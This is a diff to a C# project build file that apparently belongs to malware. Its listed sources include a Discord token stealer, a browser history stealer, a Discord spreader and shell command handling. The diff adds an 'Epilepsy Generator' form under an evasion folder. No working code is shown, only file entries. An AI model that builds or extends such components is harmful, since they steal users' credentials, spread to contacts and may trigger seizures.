@@ -181,6 +181,7 @@
     <Reference Include="System.Web" />
     <Reference Include="System.Windows.Forms" />
     <Reference Include="Microsoft.CSharp" />
+    <Reference Include="System.Xml" />
     <Reference Include="System.Xml.ReaderWriter, Version=4.1.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a, processorArchitecture=MSIL">
       <HintPath>..\packages\System.Xml.ReaderWriter.4.3.0\lib\net46\System.Xml.ReaderWriter.dll</HintPath>
     </Reference>
@@ -192,6 +193,12 @@
     <Compile Include="Armitage\Cookies\Discord Token.cs" />
     <Compile Include="Armitage\Cookies\History Stealer.cs" />
     <Compile Include="Armitage\Critical Process.cs" />
+    <Compile Include="Armitage\Evade\Epilepsy Generator.cs">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="Armitage\Evade\Epilepsy Generator.Designer.cs">
+      <DependentUpon>Epilepsy Generator.cs</DependentUpon>
+    </Compile>
     <Compile Include="Armitage\Informer.cs" />
     <Compile Include="Armitage\Postman\Discord Spreader.cs" />
     <Compile Include="Armitage\Shell\Command Types.cs" />
@@ -218,6 +225,9 @@
     </Compile>
     <Compile Include="Utilities\Sex Generator.cs" />
     <Compile Include="Utilities\Zip Creator.cs" />
+    <EmbeddedResource Include="Armitage\Evade\Epilepsy Generator.resx">
+      <DependentUpon>Epilepsy Generator.cs</DependentUpon>
+    </EmbeddedResource>
     <EmbeddedResource Include="Properties\Resources.resx">
       <Generator>ResXFileCodeGenerator</Generator>
       <LastGenOutput>Resources.Designer.cs</LastGenOutput>
